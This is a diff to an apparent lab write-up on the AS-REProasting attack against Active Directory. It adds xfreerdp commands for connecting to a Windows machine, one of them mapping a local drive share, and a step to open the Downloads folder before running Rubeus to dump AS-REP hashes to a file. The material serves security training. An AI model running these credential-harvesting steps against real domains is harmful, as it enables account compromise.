@@ -25,6 +25,17 @@ The AS-REProasting attack is similar to the Kerberoasting attack; we can obtain 
 First we need to RDP over to our WIN10 machine and perform the AS-REProasting attack. I will be using Rubeus for this attack.
 
 ```
+xfreerdp /u:(username) /p:(password) /v:(Machine IP) /dynamic-resolution
+xfreerdp /u:(username) /p:(password) /v:(Machine IP) /dynamic-resolution /drive:share,/home/XXXXXXX
+```
+
+Next we need to open up a command prompt and CD to our downloads folder where the file we need to run in located.
+
+```
+cd C:\Users\bob\Downloads
+```
+
+```
 .\Rubeus.exe asreproast /outfile:asrep.txt
 ```
 ![image](https://github.com/Matt4llan/Attack-Defense/assets/156334555/97415255-a4d8-4b43-b6ed-4fd0857a0fae)
